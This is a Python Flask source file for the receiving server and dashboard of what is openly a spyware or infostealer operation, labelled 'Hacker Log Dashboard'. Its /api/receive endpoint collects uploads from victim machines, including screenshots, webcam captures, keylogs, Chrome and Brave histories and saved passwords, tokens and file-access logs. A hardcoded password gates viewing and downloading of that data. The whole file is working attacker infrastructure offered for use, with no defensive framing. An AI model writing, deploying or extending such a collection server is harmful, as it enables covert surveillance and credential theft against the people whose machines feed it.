import os
from flask import Flask, request, send_from_directory, render_template_string, redirect, url_for
from werkzeug.utils import secure_filename
from datetime import datetime

UPLOAD_ROOT = "logs"
PASSWORD = "disha456"

app = Flask(__name__)
os.makedirs(UPLOAD_ROOT, exist_ok=True)

COLUMNS = [
    "Hostname", "Timestamp", "Screenshot", "Webcam", "Keylogs",
    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
]

HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
  <title>Log Dashboard</title>
  <style>
    body { background-color: black; color: lime; font-family: monospace; padding: 20px; }
    h2 { color: cyan; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { border: 1px solid lime; padding: 6px; text-align: center; }
    th { font-size: 16px; font-weight: bold; background-color: #111; }
    td a { color: cyan; text-decoration: none; }
    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
    button { background: black; color: lime; border: 1px solid lime; padding: 5px 10px; }
  </style>
</head>
<body>
  {% if not authed %}
    <h2>🔐 Enter Password to Access Log Viewer</h2>
    <form method="POST">
      <input name="password" type="password" placeholder="Enter password" />
      <button type="submit">Login</button>
    </form>
  {% else %}
    <h2>🧪 Hacker Log Dashboard</h2>
    <table>
      <tr>
        {% for col in columns %}
          <th>{{ col }}</th>
        {% endfor %}
      </tr>
      {% for entry in logs %}
        <tr>
          <td>{{ entry.hostname }}</td>
          <td>{{ entry.timestamp }}</td>
          {% for file in entry.files %}
            {% if file %}
              <td><a href="{{ file }}">📥</a></td>
            {% else %}
              <td>-</td>
            {% endif %}
          {% endfor %}
        </tr>
      {% endfor %}
    </table>
  {% endif %}
</body>
</html>'''

@app.route("/", methods=["GET", "POST"])
def index():
    authed = False
    if request.method == "POST" and request.form.get("password") == PASSWORD:
        authed = True
    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=get_logs() if authed else [])

@app.route("/logs")
def redirect_logs():
    return redirect(url_for("index"))

@app.route("/api/receive", methods=["POST"])
def receive():
    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    save_path = os.path.join(UPLOAD_ROOT, folder_name)
    os.makedirs(save_path, exist_ok=True)

    for file in request.files.values():
        filename = secure_filename(file.filename)
        full_path = os.path.join(save_path, filename)
        file.save(full_path)

        # Trim large file_access_log.txt files
        if "file_access" in filename.lower():
            try:
                with open(full_path, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                with open(full_path, "w", encoding="utf-8") as f:
                    f.writelines(lines[-500:])
            except Exception as e:
                print(f"[!] Failed to trim file_access_log: {e}")

    return "Logs received"

@app.route("/download/<folder>/<filename>")
def download(folder, filename):
    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)

def get_logs():
    logs = []
    for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
        folder_path = os.path.join(UPLOAD_ROOT, folder)
        if not os.path.isdir(folder_path): continue

        files = os.listdir(folder_path)
        row = {
            "timestamp": folder,
            "hostname": "Unknown",
            "files": []
        }

        for f in files:
            if "activity" in f.lower() or "system" in f.lower() or "log" in f.lower():
                try:
                    with open(os.path.join(folder_path, f), "r", encoding="utf-8") as txt:
                        content = txt.read()
                        if "Computer Name:" in content:
                            for line in content.splitlines():
                                if "Computer Name" in line:
                                    row["hostname"] = line.split(":")[1].strip()
                                    break
                except:
                    pass
                break

        def match_file(keywords):
            for file in files:
                if any(k in file.lower() for k in keywords):
                    return f"/download/{folder}/{file}"
            return None

        row["files"].append(match_file(["screenshot"]))
        row["files"].append(match_file(["webcam"]))
        row["files"].append(match_file(["keylog"]))
        row["files"].append(match_file(["decoded"]))
        row["files"].append(match_file(["chrome_history"]))
        row["files"].append(match_file(["brave_history"]))
        row["files"].append(match_file(["chrome_password"]))
        row["files"].append(match_file(["brave_password"]))
        row["files"].append(match_file(["token"]))
        row["files"].append(match_file(["recent"]))
        row["files"].append(match_file(["file_access"]))

        logs.append(row)
    return logs
